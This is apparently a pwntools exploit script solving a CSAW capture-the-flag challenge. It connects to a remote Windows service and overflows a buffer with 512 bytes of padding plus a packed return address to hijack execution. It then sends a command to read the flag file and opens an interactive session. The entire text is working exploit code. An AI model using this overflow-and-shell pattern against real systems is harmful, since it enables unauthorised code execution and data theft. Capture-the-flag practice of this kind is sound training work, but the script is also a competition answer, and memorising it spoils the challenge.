from pwn import *

# I think the output is being f'd up by the carriage returns that windows has, 
# but the debug output prints the bytes recieved just fine so we'll use that to see what's up
context.log_level = 'DEBUG'

p = remote("win.chal.csaw.io", 7777)
p.recvuntil(b'> ');
p.sendline(b'A'*512 + p32(0x62101661))

p.sendline(b'type .\\chal\\flag.txt')
print(p.recvline())
p.interactive()
